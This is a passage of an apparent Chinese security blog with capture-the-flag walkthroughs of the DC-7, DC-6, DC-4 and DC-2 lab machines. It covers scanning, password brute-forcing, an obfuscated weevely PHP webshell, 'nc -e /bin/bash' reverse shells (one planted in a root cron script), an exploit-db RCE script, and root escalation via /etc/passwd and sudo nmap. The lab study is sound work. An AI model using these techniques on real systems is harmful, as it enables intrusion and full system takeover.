        <content type="html"><![CDATA[<h1 id="DC-7靶场练习"><a href="#DC-7靶场练习" class="headerlink" title="DC-7靶场练习"></a>DC-7靶场练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali:192.168.10.128</p><p>dc-7:192.168.10.196</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机发现：</p><pre><code>netdiscover -r 192.168.10.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231193327034.png" alt="image-20211231193327034"></p><p>端口扫描</p><pre><code>nmap -sS -sV -T4 -A -p- 192.168.10.196</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231193607875.png" alt="image-20211231193607875"></p><p>发现靶机打开了22(ssh)和80(http)端口</p><p>打开web端<code>http://192.168.10.196/</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231194235606.png" alt="image-20211231194235606"></p><p>这个网站使用的CMS是Drupal8</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231194255615.png" alt="image-20211231194255615"></p><p>第一反应就是使用searchsploit和MSF来寻找利用模块，但是尝试了好几个脚本和模块都没有拿到shell</p><p>翻译一下首页的内容，获取到一点点线索，并且得到线索在框外部</p><pre><code>欢迎来到 DC-7DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)虽然这个挑战并不是那么技术性的，但如果你需要诉诸蛮力或字典攻击，你可能不会成功。您必须做的是“跳出”框框思考。方法在“外”框。 :-)</code></pre><p>回到网页发现Drupal是被DIY过的，重点看首页的footer部分，也就是网页的最下方的黑色区域，靶机的除了”Powered by Drupal”，还多了一个”@DC7USER”。谷歌搜索”@DC7USER”</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104112000213.png" alt="image-20220104112000213"></p><p>这是他的项目，可以在github上查看源码，找到配置文件<code>config.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104112445470.png" alt="image-20220104112445470"></p><pre><code>&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = &quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><p>在这个文件中可以看到账号密码，</p><p>使用ssh连接,并且能够连接成功</p><pre><code>ssh dc7user@192.168.10.196</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104113501353.png" alt="image-20220104113501353"></p><p>在这个目录下有两个文件，文件夹backups里面有<code>website.sql.gpg  website.tar.gz.gpg</code>这两个文件</p><p>经过百度了解到这两个是加密文件，没有利用的地方</p><p>再查看一下mbox,这里有许多长得差不多的邮件信息,发现是一个计划任务：自动备份数据库的执行情况，调用的脚本是&#x2F;opt&#x2F;scripts&#x2F;backups.sh，是root权限执行的。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104115113148.png" alt="image-20220104115113148"></p><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><p>进入&#x2F;opt&#x2F;scripts&#x2F;这个目录,查看backups.sh这个文件,内容如下：</p><pre><code>#!/bin/bashrm /home/dc7user/backups/*cd /var/www/html/drush sql-dump --result-file=/home/dc7user/backups/website.sqlcd ..tar -czf /home/dc7user/backups/website.tar.gz html/gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sqlgpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gzchown dc7user:dc7user /home/dc7user/backups/*rm /home/dc7user/backups/website.sqlrm /home/dc7user/backups/website.tar.gz</code></pre><p>在这里可以看到有两个比较少见的命令<code>drush</code>和<code>gpg</code></p><p>经过百度得知drush命令是drupal的一套shell脚本或bat脚本，这个可以用来修改网站的admin账号的密码</p><pre><code>drush user-password admin --password=&quot;123456&quot;</code></pre><p>这个命令要在&#x2F;var&#x2F;www&#x2F;html目录下才能执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104202027758.png" alt="image-20220104202027758"></p><p>修改了密码后，去登录</p><p>登录成功后</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203208177.png" alt="image-20220104203208177"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203232079.png" alt="image-20220104203232079"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203258438.png" alt="image-20220104203258438"></p><p>在这里可以写入网页，但是网页类型没有php模式</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203620587.png" alt="image-20220104203620587"></p><p>这里需要自己安装插件,下载连接：</p><pre><code>https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</code></pre><p>下载完成后，点击<code>Extend-&gt;+ install new module</code>选择刚下载的文件进行安装</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104204357472.png" alt="image-20220104204357472"></p><p>安装完成后点击Extend往下拉，勾选并启用PHP Filter模块，点击install</p><p>完成后回到写入网页的页面，可以发现这里能写php代码了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104204924769.png" alt="image-20220104204924769"></p><p>用weevely生成一个木马</p><pre><code>weevely generate cmd shell.php</code></pre><ul><li><p>generate 代表生成木马</p></li><li><p>a 为木马连接时的密码</p></li><li><p>a.php 为木马的文件名</p></li></ul><p>将shell.php的内容复制到Body里，title随便写，点击save</p><pre><code class="php">&lt;?php$r=&#39;o.=$t&#123;$i&#125;^QE$k&#123;QE$j&#125;;&#125;QE&#125;rQEeturnQE $o;&#125;if (@preg_QEmaQEtch(&quot;/$kQEh(.+)QE$kf/&quot;,@QEfiQEle_get_conteQEQEnts(&quot;php://iQEQE&#39;;$z=str_replace(&#39;EJ&#39;,&#39;&#39;,&#39;EJcreEJateEJEJ_funcEJEJtion&#39;);$d=&#39;&#123;$QEc=strlQEeQEQEn($k);$l=strQElen($t);$QEo=QE&quot;&quot;;for($i=QE0;$i&lt;$lQE;QE)&#123;for($j=QE0;QE($j&lt;$c&amp;QE&amp;$i&lt;QE$l);$j++,$QEi++)&#123;$QE&#39;;$J=&#39;contQEents();QE@ob_enQEd_cleaQEn(QE);$r=@basQEe64_QEencode(@xQE(@gzcomQEprQEess($o),$kQE)QE);pQEriQEnt(&quot;$p$kh$r$kf&quot;);&#125;&#39;;$j=&#39;$k=&quot;QEdfff0aQE7f&quot;;$kh=&quot;QEa1aQE55c8c1a49&quot;QE;QE$kf=&quot;66c1QE9f6da452&quot;QE;$pQE=&quot;6nMQEW0DQEI50PmP4TH8&quot;;QEQEfunctioQEn x($t,$k)&#39;;$X=&#39;nput&quot;)QEQE,$m)QE==1) &#123;@obQE_start();@evaQEl(QE@gzunQEcompress(@x(@baQEse6QE4_decodeQEQE($m[1]),$k))QE);$o=@oQEQEb_get_&#39;;$G=str_replace(&#39;QE&#39;,&#39;&#39;,$j.$d.$r.$X.$J);$N=$z(&#39;&#39;,$G);$N();?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212119928.png" alt="image-20220104212119928"></p><p>得到木马地址<code>http://192.168.10.196/node/5</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212256254.png" alt="image-20220104212256254"></p><p>用接下来用weevely进行连接</p><pre><code>weevely http://192.168.10.196/node/5 cmd</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212335214.png" alt="image-20220104212335214"></p><p>成功拿到shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>由上面可知，<code>/opt/scripts/backups.sh</code>脚本执行是root权限，所以只要把反弹shell命令写入该脚本即可得到root权限</p><pre><code>echo &#39;nc -e /bin/bash 192.168.10.128 1234&#39;&gt;&gt;/opt/scripts/backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104213207189.png" alt="image-20220104213207189"></p><p>kali这边</p><pre><code>rlwrap nc -lvvp 1234</code></pre><p>写入成功，等待其自动执行</p><p>反弹shell成功，并拿到root权限</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104215415008.png" alt="image-20220104215415008"></p><pre><code>cd /rootcat theflag.txt</code></pre><p>拿到flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104215600625.png" alt="image-20220104215600625"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-6靶场练习</title>
      <link href="/2021/12/24/DC-6%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/24/DC-6%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-6靶场练习"><a href="#DC-6靶场练习" class="headerlink" title="DC-6靶场练习"></a>DC-6靶场练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali:192.168.10.128</p><p>dc-6: 192.168.10.174</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>nmap 192.168.10.0/24</code></pre><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224152919978.png" alt="image-20211224152919978" style="zoom:150%;" /><p>这里可以看到靶机已经开了22端口和80端口</p><p>再用下面命令查看是否还开着其他端口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224153405661.png" alt="image-20211224153405661"></p><p>打开web端，打开<code>http://192.168.10.174/</code>,发现网页会跳转到<code>http://wordy/</code>并且打不开</p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224153757108.png" alt="image-20211224153757108" style="zoom:80%;" /><p>修改hosts文件，在文件里面添加</p><pre><code>192.168.10.174 wordy</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154009380.png" alt="image-20211224154009380"></p><p>修改后保存，重新打开<code>http://wordy/</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154113236.png" alt="image-20211224154113236"></p><p>打开成功</p><p>这是个WordPress的站点，<code>WordPress 5.1.1</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154354895.png" alt="image-20211224154354895"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre><code>dirb http://wordy/</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154743386.png" alt="image-20211224154743386"></p><p>找到了后台登录的目录</p><pre><code>http://wordy/wp-admin/</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154933030.png" alt="image-20211224154933030"></p><h2 id="爆破后台账号密码"><a href="#爆破后台账号密码" class="headerlink" title="爆破后台账号密码"></a>爆破后台账号密码</h2><p>通过wpscan爆破后台用户名</p><pre><code>wpscan --url http://wordy/ -e u</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224170856976.png" alt="image-20211224170856976"></p><pre><code>admin mark graham sarah jens</code></pre><p>将其保存在user.txt中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224173400687.png" alt="image-20211224173400687"></p><p>有密码，还需要密码</p><p>作者为了降低难度，在vulhub给出了提示:dc-6的字典是可以被筛检的，可以大大减少我们爆破的时间。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224174546662.png" alt="image-20211224174546662"></p><pre><code>zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 &gt; password.txt</code></pre><p>运行命令后得到的字典如下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225133149850.png" alt="image-20211225133149850"></p><p>然后就是爆破:</p><pre><code>wpscan --url http://wordy/ -P password.txt -U user.txt</code></pre><p>获得账号密码:   mark &#x2F; helpdesk01</p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225134221550.png" alt="image-20211225134221550" style="zoom:150%;" /><p>登录后台：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225134635757.png" alt="image-20211225134635757"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>来到后台后，发现插件activity monitor，并且它的功能是记录各用户的操作记录</p><p>盲猜这个插件存在漏洞</p><p>寻找这个插件的漏洞脚本，能找到说明真的是存在漏洞</p><pre><code>searchsploit activity monitor </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225204259319.png" alt="image-20211225204259319"></p><p>找到一个RCE的脚本，即第四条:</p><pre><code>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2) | php/webapps/50110.py</code></pre><p>尝试利用这个脚本</p><p>先找到这个脚本的路径</p><pre><code>find / -name 50110.py</code></pre><p>得到路径</p><pre><code>/usr/share/exploitdb/exploits/php/webapps/50110.py</code></pre><p>执行脚本:</p><pre><code>python3 /usr/share/exploitdb/exploits/php/webapps/50110.py</code></pre><p>执行后需要输入目标ip地址和后台登录的账号密码，执行成功后会返回一个shell</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225204944700.png" alt="image-20211225204944700"></p><p>拿到shell后，进行反弹shell到kali</p><pre><code>kali：nc -lvvp 1234dc-6: nc -e /bin/bash 192.168.10.128 1234连接成功后改善一下交互交互界面kali: python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225205500667.png" alt="image-20211225205500667"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225205508943.png" alt="image-20211225205508943"></p><p>反弹shell成功后，就是寻找提权线索</p><p>来到home目录，在mark&#x2F;stuff中找到一个things-to-do.txt,内容如下：</p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>在这里可以知道另一个用户的账号密码：</p><pre><code>graham  / GSo7isUM1D4</code></pre><p>切换用户</p><pre><code>su graham</code></pre><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225211453645.png" alt="image-20211225211453645" style="zoom: 200%;" /><p>然后在&#x2F;home&#x2F;jens中找到一个backups.sh,内容是</p><pre><code>#!/bin/bashtar -czf backups.tar.gz /var/www/html</code></pre><p>大概的意思是对web的文件进行打包备份</p><p>查看该用户能执行的操作</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225213635814.png" alt="image-20211225213635814"></p><p>可以看到该用户可以执行backups.sh</p><p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本</p><pre><code>echo &quot;/bin/bash&quot; &gt;&gt; backups.shsudo -u jens ./backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225215649548.png" alt="image-20211225215649548"></p><p>执行成功后，切换到了jens用户</p><p>查看这个用户可以执行的操作</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225220346275.png" alt="image-20211225220346275"></p><p>该用户可以执行nmap,可以通过namp提权</p><pre><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt;getShellsudo nmap --script=getShell</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225221642374.png" alt="image-20211225221642374"></p><p>提权成功，寻找flag,按照dc靶场的惯例，flag在root文件夹下</p><pre><code>cd /rootlscat theflag.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225221826625.png" alt="image-20211225221826625"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4靶场练习</title>
      <link href="/2021/12/21/DC-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/21/DC-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-4靶场练习"><a href="#DC-4靶场练习" class="headerlink" title="DC-4靶场练习"></a>DC-4靶场练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali:192.168.10.128</p><p>dc-4:192.168.10.191(未知)</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先探测主机，发现靶机dc-4</p><pre><code>nmap 192.168.10.0/24     </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221145649437.png" alt="image-20211221145649437"></p><p>靶机IP为192.168.10.191,开放了22和80端口</p><p>经过dc-2的教训，查看作者是否还隐藏了其他端口</p><pre><code>nmap -A -p 1-65535 192.168.10.191</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221150338413.png" alt="image-20211221150338413"></p><p>就两个开放的端口</p><p>打开web端，只有一个简单的登录界面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221150531843.png" alt="image-20211221150531843"></p><p>根据<code>Admin Information Systems Login</code>提示，这里是让我们用admin登录</p><h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>Username:admin,Password:随便填，点击Submit，用burpsuite抓包进行密码爆破</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151139798.png" alt="image-20211221151139798"></p><p>密码字典我随便用一个，经过一段时间，密码爆破出来了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151312035.png" alt="image-20211221151312035"></p><p>密码为happy</p><p>尝试登录：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151458491.png" alt="image-20211221151458491"></p><p>登录成功</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>登录成功后，点击Command ,发现这里是执行命令的页面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151713181.png" alt="image-20211221151713181"></p><p>用burpsuite进行抓包重放</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151957608.png" alt="image-20211221151957608"></p><p>可以发现这里的命令，空格用<code>+</code>号代替了</p><p>尝试更改使用其他命令，看看这里能否执行:</p><p>这里我把命令改为了<code>id</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152213986.png" alt="image-20211221152213986"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152231154.png" alt="image-20211221152231154"></p><p>可以看到命令执行了</p><p>尝试反弹shell</p><pre><code>kali：nc -lvvp 1234</code></pre><p>http请求包处的命令改为：</p><pre><code>radio=nc+-e+/bin/bash+192.168.10.128+1234&amp;submit=Run</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152801725.png" alt="image-20211221152801725"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152824248.png" alt="image-20211221152824248"></p><p>可以看到反弹shell成功</p><p>为了控制台好看一丢丢,输入下面的命令</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153039086.png" alt="image-20211221153039086"></p><h2 id="寻找有用的信息"><a href="#寻找有用的信息" class="headerlink" title="寻找有用的信息"></a>寻找有用的信息</h2><p>在&#x2F;home 目录下发现了charles  jim  sam这三个目录</p><p>但是只有jim目录有东西</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153534277.png" alt="image-20211221153534277"></p><p>在backups目录下看到了个old-password.bak,打开一看，是个密码字典</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154021780.png" alt="image-20211221154021780"></p><p>先保存下来，命名为old-password.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153948338.png" alt="image-20211221153948338"></p><p>查看下一个文件</p><pre><code>cat mbox</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154236304.png" alt="image-20211221154236304"></p><p>发现没有权限</p><p>先不管它，看看test.sh</p><pre><code>cat test.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154428348.png" alt="image-20211221154428348"></p><p>没啥有用的信息，但是这好像是个提示</p><h2 id="对22端口下手"><a href="#对22端口下手" class="headerlink" title="对22端口下手"></a>对22端口下手</h2><p>我们还有个端口没有用到，22端口，ssh连接</p><p>连接条件是，需要用户名和密码。刚刚再&#x2F;home目录下的三个目录名charles  jim  sam，应该就是存在的用户名，只有jim文件夹下有东西，ssh连接使用的用户名可以确定用的是jim，密码应该用的是</p><p>old-password.bak中的其中一个</p><p>所以，这里用hydra对ssh的密码进行爆破</p><pre><code>hydra -l jim -P old-password.txt 192.168.10.191 ssh -v  </code></pre><blockquote><p>-l 指定用户名,</p><p>-P  指定密码字典</p><p>-v 现实详细的执行过程</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221160053255.png" alt="image-20211221160053255"></p><p>密码爆破出来了，为jibril04</p><p>ssh连接</p><pre><code>ssh jim@192.168.10.191密码：jibril04</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221183312896.png" alt="image-20211221183312896"></p><p>连接成功</p><p>查看mbox,发现是发给jim的一封邮件的一些描述</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221214637420.png" alt="image-20211221214637420"></p><p>去&#x2F;var&#x2F;mail查看邮件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221214809599.png" alt="image-20211221214809599"></p><p>在这可以看到有charles 的密码<code>^xHhA&amp;hvim0y</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>切换用户</p><pre><code>su charles</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221215116931.png" alt="image-20211221215116931"></p><p>切换成功！</p><p>尝试sudo提权</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221220600021.png" alt="image-20211221220600021"></p><p>发现该用户有一个root权限的命令:teehee</p><blockquote><p>teehee命令可以写入文件内容并不覆盖文件原有内容</p><p>使用teehee命令将一个无密码用户admin写入到&#x2F;etc&#x2F;passwd文件，并加入到root组中</p><p>格式:   </p><p>用户名:是否有密码保护(x即有保护):uid:gid:全称:home目录:&#x2F;bin&#x2F;bash</p></blockquote><p>用该命令提权</p><pre><code>echo &quot;hacker::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code></pre><p>追加并提权成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221222914878.png" alt="image-20211221222914878"></p><h2 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h2><p>按照dc-4之前的靶机，最后的flag都是在root文件夹下的</p><p>不出所料啊，在root文件夹下找到flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221223627254.png" alt="image-20211221223627254"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶场练习</title>
      <link href="/2021/12/20/DC-2%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/20/DC-2%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2靶场练习"><a href="#DC-2靶场练习" class="headerlink" title="DC-2靶场练习"></a>DC-2靶场练习</h1><h2 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h2><p>kali:192.168.10.128</p><p>靶机dc-2:192.168.10.184(假装不知道)</p><h2 id="练习开始"><a href="#练习开始" class="headerlink" title="练习开始"></a>练习开始</h2><p>先用nmap找一下靶机的IP和端口：</p><pre><code>nmap 192.168.10.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220141827545.png" alt="image-20211220141827545"></p><p>扫出靶机，IP：192.168.10.184</p><p>这里只发现开了个80端口，很可疑，有猫腻，换条命令试试：</p><pre><code>nmap -A -p 1-65535 192.168.10.184</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220142242781.png" alt="image-20211220142242781"></p><p>果然有猫腻：隐藏了ssh服务的7744端口</p><p>先去web端看看：<code>http://192.168.10.184</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220142637899.png" alt="image-20211220142637899"></p><p>它会自动跳转到dc-2,似乎被重定向了</p><p>修改一下hosts文件就行了</p><pre><code>vim /etc/hosts</code></pre><p>加上<code>192.168.10.184 dc-2</code> 保存即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143420812.png" alt="image-20211220143420812"></p><p>重新打开web端，成功打开网站</p><p>并发现flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143713228.png" alt="image-20211220143713228"></p><p>打开flag,得到：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143819425.png" alt="image-20211220143819425"></p><p>这里似乎在暗示我用cewl这个工具</p><blockquote><p>cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。cewl还有一个相关的命令行工具应用FAB，它使用相同的元数据提取技术从已下载的列表中创建作者&#x2F;创建者列表。</p></blockquote><pre><code>cewl http://dc-2 -w 1.txt</code></pre><p>得到字典：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220145059991.png" alt="image-20211220145059991"></p><p>这是密码字典，缺用户名</p><p>再查看一下CMS</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220145810241.png" alt="image-20211220145810241"></p><p>该网站的CMS为WordPress</p><p>可以使用wpscan</p><blockquote><p>WPScan 是 Kali Linux 默认自带的一款漏洞扫描工具，它采用 Ruby 编写，能够扫描 WordPress 网站中的多种安全漏洞，其中包括 WordPress 本身的漏洞、插件漏洞和主题漏洞。最新版本 WPScan 的数据库中包含超过 18000 种插件漏洞和 2600 种主题漏洞，并且支持最新版本的 WordPress。值得注意的是，它不仅能够扫描类似 robots.txt 这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p></blockquote><p>首次打开，我们可以先更新其漏洞库</p><pre><code>wpscan -updata</code></pre><p>扫描站点，枚举用户名</p><pre><code>wpscan --url http://dc-2/ -e u  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220151051089.png" alt="image-20211220151051089"></p><p>得到三个用户，保存在user.txt中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220151536633.png" alt="image-20211220151536633"></p><p>下一步就是爆破</p><pre><code>wpscan --url http://dc-2 -U user.txt -P 1.txt  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220155104164.png" alt="image-20211220155104164"></p><p>两个用户的密码都出来了</p><ul><li><p>jerry &#x2F; adipiscing </p></li><li><p>tom &#x2F; parturient</p></li></ul><p>扫描目录：</p><pre><code>dirb http://192.168.10.184</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220155925923.png" alt="image-20211220155925923"></p><p>得到后台登录地址：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160036875.png" alt="image-20211220160036875"></p><p>用jerry &#x2F; adipiscing 登录一下</p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160359443.png" alt="image-20211220160359443"></p><p>找到flag2</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160449145.png" alt="image-20211220160449145"></p><p>用tom &#x2F; parturient 登录，没发现什么有用的东西</p><p>根据flag2的提示</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161221589.png" alt="image-20211220161221589"></p><p>我想起了还有个端口没利用，7744端口，ssh服务</p><pre><code>ssh tom@192.168.10.184 -p 7744 </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161606583.png" alt="image-20211220161606583"></p><p>在目录下发现flag3.txt,但是查看不了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161918062.png" alt="image-20211220161918062"></p><p>-rbash是受限制的命令，但是-rbash是可以绕过</p><p>用以下命令查询可用命令：</p><pre><code>compgen -c </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220164132234.png" alt="image-20211220164132234"></p><p>发现<code>vi</code>可以使用</p><pre><code>vi flag3.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220164303545.png" alt="image-20211220164303545"></p><p>”可怜的老汤姆总是追着杰瑞。 也许他应该为他造成的所有压力而苏醒“</p><p>这里似乎没有了思路，但是打靶机的还有一个重要步骤没有做，那就是提权</p><p>因为<code>vi</code>可以使用，那就用这个提权了,提权步骤如下</p><pre><code>vi flag3.txt:set shell=/bin/sh:shell</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180600050.png" alt="image-20211220180600050"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180634523.png" alt="image-20211220180634523"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180658690.png" alt="image-20211220180658690"></p><p>到这里，只能说提权了，但没有完全提权，还是有些命令不能用</p><p><code>cd</code>是可以使用的，可以去其他目录看看</p><p><img 